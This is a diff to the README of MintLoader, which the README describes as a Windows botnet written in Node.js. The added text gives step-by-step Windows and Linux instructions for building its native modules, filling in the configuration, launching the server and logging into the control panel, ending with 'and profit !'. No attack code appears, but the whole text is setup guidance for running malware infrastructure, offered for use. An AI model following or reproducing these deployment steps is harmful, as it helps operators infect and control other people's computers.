@@ -18,20 +18,34 @@ MintLoader is a simple windows botnet coded entirely in node.js. It has only two
 * ... and many more!
 
 ## How to use ?
-* rename config_example.js to config.js.
-* complete the information of this configuration.
+
+### Windows System
+* rename config_example.js to config.js and complete the information of this configuration.
 * install [Node.js](https://nodejs.org/) if not already done.
+* install updated [Python](https://www.python.org/) and [Visual Studio](https://visualstudio.microsoft.com/) with c++ extension.
 * run `npm i -g pkg && npm i` at the root of the folder.
-* run `npm i` in the client folder at the root of the folder.
+* run `npm i` in the client folder.
 * launch it using `node app.js`.
+* navigate to `config.baseurl + panel/login` and profit !
+
+### Linux System
+for the loader to be functional under linux it will be necessary to install native nodejs modules that can only be built under windows.
+* take a windows with updated python and visual studio with the c++ development extension.
+* install [Node.js](https://nodejs.org/) if not already done on both windows and linux.
+* run `npm i` at the root of the folder on windows.
+* run `npm i` in the client folder on windows.
+* copy the two folders `node_modules` created with the two previous commands from your windows to the same place in the MintLoader folder on your linux.
+* run `npm i -g pkg` on linux.
+* rename config_example.js to config.js and complete the information of this configuration on linux.
+* launch on linux it using `node app.js`.
 * navigate to `config.baseurl + panel/login` and profit !
 
 ## Supported operating systems
 **Client**
-* Every windows system supported by node.js (Windows 8.1 .. Windows 11).
+* Every windows system supported by Node.js now (Windows 8.1 .. Windows 11).
 
 **Panel**
-* All operating systems that nodejs currently supports.
+* All operating systems that Node.js currently supports.
 
 ## License
 MintLoader is distributed under the [MIT License](LICENSE).
